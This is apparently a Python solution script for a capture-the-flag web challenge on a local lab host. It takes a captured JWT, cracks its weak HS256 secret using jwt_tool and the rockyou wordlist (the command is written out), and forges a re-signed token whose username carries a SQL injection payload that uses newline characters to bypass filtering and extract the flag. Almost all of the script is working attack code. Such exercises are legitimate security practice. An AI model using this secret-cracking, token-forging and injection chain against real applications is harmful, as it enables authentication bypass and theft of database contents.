import jwt
from datetime import datetime, timedelta
from requests import *

'''
first create account, login take the token using burp, replace the token with the one down
then after creating the desired token replace it with original to get the flag :) 
'''
url="http://172.17.0.2:5000"
def decode_jwt(token, secret_key):
    try:
        decoded_token = jwt.decode(token, secret_key, algorithms=['HS256'])
        return decoded_token
    except jwt.ExpiredSignatureError:
        print("Token has expired.")
    except jwt.InvalidTokenError:
        print("Invalid token.")

def encode_jwt(payload, secret_key, expiration_minutes=60):
    expiration_time = datetime.utcnow() + timedelta(minutes=expiration_minutes)
    payload['exp'] = expiration_time
    encoded_token = jwt.encode(payload, secret_key, algorithm='HS256')
    return encoded_token


jwt_token  = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InMxbXBsZTEyMyIsInBhc3N3b3JkIjoiczFtcGxlMTIzIiwiZXhwIjoxNzE0MTU5ODkzfQ.rWjj8druVLxF31xDhVnvgKqnQrUvIvobv4ahzx5kvP0'

your_secret_key = "secret" # using jwt_tool https://github.com/ticarpi/jwt_tool
'''
python3 jwt_tool.py 'jwt goes here' -d /usr/share/wordlists/rockyou.txt -C

'''

decoded_data = decode_jwt(jwt_token, your_secret_key)
if decoded_data:
    print("Original Decoded Token Data:", decoded_data)

    decoded_data['username'] = "'union\x0aselect\x0aflag\x0afrom\x0aflag--"
    decoded_data['password'] = ""

    new_token = encode_jwt(decoded_data, your_secret_key)
    print("New JWT Token:", new_token)
